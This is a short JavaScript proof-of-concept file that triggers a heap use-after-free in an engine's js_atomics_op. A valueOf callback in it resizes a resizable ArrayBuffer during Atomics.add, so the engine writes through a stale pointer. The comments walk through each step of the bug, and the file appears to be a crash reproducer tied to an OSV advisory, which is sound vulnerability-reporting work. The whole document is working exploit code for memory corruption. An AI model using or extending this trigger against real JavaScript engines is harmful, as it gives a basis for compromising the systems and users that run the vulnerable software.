// PoC for heap-use-after-free in js_atomics_op (CVE / OSV-2026-703)
// The bug: js_atomics_op computes a raw pointer into the ArrayBuffer data
// before converting the value argument. The valueOf callback can resize the
// resizable ArrayBuffer, causing realloc to move the data. The stale pointer
// is then used for the atomic write -> use-after-free.

var ab = new ArrayBuffer(8, { maxByteLength: 65536 });
var ta = new Int32Array(ab);

var evil = {
    valueOf: function() {
        // Resize to a much larger size to force realloc to move the buffer
        ab.resize(65536);
        // Allocate some objects to make reuse of old memory more likely
        var x = new ArrayBuffer(128);
        var y = new ArrayBuffer(256);
        return 42;
    }
};

// Atomics.add calls js_atomics_op which:
// 1. Gets ptr from the current buffer via js_atomics_get_ptr
// 2. Calls JS_ToUint32 on evil, triggering valueOf -> resize -> realloc
// 3. Uses stale ptr for atomic_fetch_add -> heap-use-after-free WRITE 4
Atomics.add(ta, 0, evil);